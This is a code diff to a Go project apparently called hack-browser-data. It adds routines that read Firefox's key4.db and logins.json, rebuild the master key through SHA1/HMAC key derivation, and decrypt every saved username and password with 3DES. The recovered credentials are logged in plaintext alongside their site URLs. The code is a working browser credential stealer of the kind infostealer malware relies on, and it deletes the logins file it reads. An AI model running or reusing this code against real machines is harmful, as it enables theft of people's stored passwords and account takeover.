@@ -1,9 +1,18 @@
 package core
 
 import (
+	"bytes"
+	"crypto/cipher"
+	"crypto/des"
+	"crypto/hmac"
+	"crypto/sha1"
 	"database/sql"
+	"encoding/asn1"
+	"encoding/base64"
+	"encoding/hex"
 	"hack-browser-data/log"
 	"hack-browser-data/utils"
+	"io/ioutil"
 	"os"
 	"sort"
 	"time"
@@ -285,4 +294,267 @@ func getBookmarkChildren(value gjson.Result) (children gjson.Result) {
 		}
 	}
 	return children
+}
+
+var queryPassword = `SELECT item1, item2 FROM metaData WHERE id = 'password'`
+
+func checkKey(key4 string) (b [][]byte) {
+	keyDB, err := sql.Open("sqlite3", key4)
+	defer func() {
+		if err := keyDB.Close(); err != nil {
+			log.Println(err)
+		}
+	}()
+	if err != nil {
+		log.Println(err)
+	}
+	err = keyDB.Ping()
+	rows, err := keyDB.Query(queryPassword)
+	defer func() {
+		if err := rows.Close(); err != nil {
+			log.Println(err)
+		}
+	}()
+	for rows.Next() {
+		var (
+			item1, item2 []byte
+		)
+		if err := rows.Scan(&item1, &item2); err != nil {
+			log.Println(err)
+		}
+		b = append(b, item1, item2)
+	}
+	return b
+}
+
+var queryDecode = `SELECT a11, a102 from nssPrivate;`
+
+func checkA102(key4 string) (b [][]byte) {
+	keyDB, err := sql.Open("sqlite3", key4)
+	defer func() {
+		if err := keyDB.Close(); err != nil {
+			log.Println(err)
+		}
+	}()
+	if err != nil {
+		log.Println(err)
+	}
+	rows, err := keyDB.Query(queryDecode)
+	defer func() {
+		if err := rows.Close(); err != nil {
+			log.Println(err)
+		}
+	}()
+	for rows.Next() {
+		var (
+			a11, a102 []byte
+		)
+		if err := rows.Scan(&a11, &a102); err != nil {
+			log.Println(err)
+		}
+		b = append(b, a11, a102)
+	}
+	log.Println(b)
+	return b
+}
+
+/*
+ASN1 PBE Structures
+SEQUENCE (2 elem)
+	SEQUENCE (2 elem)
+		OBJECT IDENTIFIER
+		SEQUENCE (2 elem)
+			OCTET STRING (20 byte)
+			INTEGER 1
+	OCTET STRING (16 byte)
+*/
+
+type PBEAlgorithms struct {
+	SequenceA
+	CipherText []byte
+}
+
+type SequenceA struct {
+	DecryptMethod asn1.ObjectIdentifier
+	SequenceB
+}
+
+type SequenceB struct {
+	EntrySalt []byte
+	Len       int
+}
+
+/*
+SEQUENCE (3 elem)
+	OCTET STRING (16 byte)
+	SEQUENCE (2 elem)
+		OBJECT IDENTIFIER 1.2.840.113549.3.7 des-EDE3-CBC (RSADSI encryptionAlgorithm)
+		OCTET STRING (8 byte)
+	OCTET STRING (16 byte)
+*/
+type PasswordAsn1 struct {
+	CipherText []byte
+	SequenceIV
+	Encrypted []byte
+}
+
+type SequenceIV struct {
+	asn1.ObjectIdentifier
+	Iv []byte
+}
+
+func decryptPBE(decodeItem []byte) (pbe PBEAlgorithms) {
+	_, err := asn1.Unmarshal(decodeItem, &pbe)
+	if err != nil {
+		log.Error(err)
+	}
+	return
+}
+
+func DecodeKey4() {
+	h1 := checkKey("key4.db")
+	globalSalt := h1[0]
+	decodedItem := h1[1]
+	keyLin := []byte{248, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1}
+	pbe := decryptPBE(decodedItem)
+	m := checkPassword(globalSalt, pbe.EntrySalt, pbe.CipherText)
+	var finallyKey []byte
+	if bytes.Contains(m, []byte("password-check")) {
+		log.Println("password-check success")
+		h2 := checkA102("key4.db")
+		a11 := h2[0]
+		a102 := h2[1]
+		m := bytes.Compare(a102, keyLin)
+		if m == 0 {
+			pbe2 := decryptPBE(a11)
+			log.Debugf("decrypt asn1 pbe success")
+			finallyKey = checkPassword(globalSalt, pbe2.EntrySalt, pbe2.CipherText)[:24]
+			log.Debugf("finally key", finallyKey, hex.EncodeToString(finallyKey))
+		}
+	}
+	allLogins := GetLoginData("logins.json")
+	for _, v := range allLogins {
+		log.Warn(hex.EncodeToString(v.encryptUser))
+		s1 := decryptLogin(v.encryptUser)
+		log.Warn(hex.EncodeToString(v.encryptPass))
+		s2 := decryptLogin(v.encryptPass)
+		log.Println(s1, s1.CipherText, s1.Encrypted, s1.Iv)
+		block, err := des.NewTripleDESCipher(finallyKey)
+		if err != nil {
+			log.Println(err)
+		}
+		blockMode := cipher.NewCBCDecrypter(block, s1.Iv)
+		sq := make([]byte, len(s1.Encrypted))
+		blockMode.CryptBlocks(sq, s1.Encrypted)
+		blockMode2 := cipher.NewCBCDecrypter(block, s2.Iv)
+		sq2 := make([]byte, len(s2.Encrypted))
+		blockMode2.CryptBlocks(sq2, s2.Encrypted)
+		log.Errorf("%s:%s:%s", v.loginUrl, string(sq), string(sq2))
+	}
+}
+
+func checkPassword(globalSalt, entrySalt, encryptText []byte) []byte {
+	//byte[] GLMP; // GlobalSalt + MasterPassword
+	//byte[] HP; // SHA1(GLMP)
+	//byte[] HPES; // HP + EntrySalt
+	//byte[] CHP; // SHA1(HPES)
+	//byte[] PES; // EntrySalt completed to 20 bytes by zero
+	//byte[] PESES; // PES + EntrySalt
+	//byte[] k1;
+	//byte[] tk;
+	//byte[] k2;
+	//byte[] k; // final value conytaining key and iv
+	sha1.New()
+	hp := sha1.Sum(globalSalt)
+	log.Warn(hex.EncodeToString(hp[:]))
+	log.Println(len(entrySalt))
+	s := append(hp[:], entrySalt...)
+	log.Warn(hex.EncodeToString(s))
+	chp := sha1.Sum(s)
+	log.Warn(hex.EncodeToString(chp[:]))
+	pes := paddingZero(entrySalt, 20)
+	tk := hmac.New(sha1.New, chp[:])
+	tk.Write(pes)
+	pes = append(pes, entrySalt...)
+	log.Warn(hex.EncodeToString(pes))
+	//k1 = hmac.new(chp, pes + entrySalt, sha1).digest()
+	//tk = hmac.new(chp, pes, sha1).digest()
+	k1 := hmac.New(sha1.New, chp[:])
+	k1.Write(pes)
+	log.Warn(hex.EncodeToString(k1.Sum(nil)))
+	log.Warn(hex.EncodeToString(tk.Sum(nil)))
+	//k2 = hmac.new(chp, tk + entrySalt, sha1).digest()
+	tkPlus := append(tk.Sum(nil), entrySalt...)
+	k2 := hmac.New(sha1.New, chp[:])
+	k2.Write(tkPlus)
+	log.Warn(hex.EncodeToString(k2.Sum(nil)))
+	k := append(k1.Sum(nil), k2.Sum(nil)...)
+	iv := k[len(k)-8:]
+	key := k[:24]
+	log.Warn("key=", hex.EncodeToString(key), "iv=", hex.EncodeToString(iv))
+	block, err := des.NewTripleDESCipher(key)
+	if err != nil {
+		log.Println(err)
+	}
+	blockMode := cipher.NewCBCDecrypter(block, iv)
+	sq := make([]byte, len(encryptText))
+	blockMode.CryptBlocks(sq, encryptText)
+	return sq
+}
+
+func paddingZero(s []byte, l int) []byte {
+	h := l - len(s)
+	if h <= 0 {
+		return s
+	} else {
+		for i := len(s); i < l; i++ {
+			s = append(s, 0)
+		}
+		return s
+	}
+}
+
+type Logins struct {
+	encryptUser []byte
+	encryptPass []byte
+	loginUrl    string
+	createTime  int64
+}
+
+func GetLoginData(loginsJson string) (l []Logins) {
+	s, err := ioutil.ReadFile(loginsJson)
+	if err != nil {
+		log.Warn(err)
+	}
+	defer os.Remove(loginsJson)
+	h := gjson.GetBytes(s, "logins")
+	if h.Exists() {
+		for _, v := range h.Array() {
+			var (
+				m Logins
+				u []byte
+				p []byte
+			)
+
+			m.loginUrl = v.Get("formSubmitURL").String()
+			u, err = base64.StdEncoding.DecodeString(v.Get("encryptedUsername").String())
+			m.encryptUser = u
+			if err != nil {
+				log.Println(err)
+			}
+			p, err = base64.StdEncoding.DecodeString(v.Get("encryptedPassword").String())
+			m.encryptPass = p
+			m.createTime = v.Get("timeCreated").Int()
+			l = append(l, m)
+		}
+	}
+	return
+}
+
+func decryptLogin(s []byte) (pbe PasswordAsn1) {
+	_, err := asn1.Unmarshal(s, &pbe)
+	if err != nil {
+		log.Println(err)
+	}
+	return pbe
 }
